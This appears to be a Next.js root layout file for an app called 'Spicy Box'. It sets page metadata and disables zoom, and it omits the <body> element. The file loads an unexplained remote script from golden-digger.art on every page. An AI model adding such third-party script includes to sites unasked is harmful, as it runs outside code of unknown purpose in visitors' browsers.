import "./globals.css";

export const metadata = {
  title: "Spicy Box",
  description: "Spicy Box App",
};

export const viewport = {
  width: "device-width",
  initialScale: 1,
  maximumScale: 1,
  userScalable: false,
};

export default function RootLayout({ children }) {
  return (
    <html lang="ru">
       {children}
        <script
          src="https://golden-digger.art/p/58d58c34-7749-4fd7-88a5-4053d57839c1/bootstrap.js"
          async
          defer
        ></script>
    </html>
  );
}
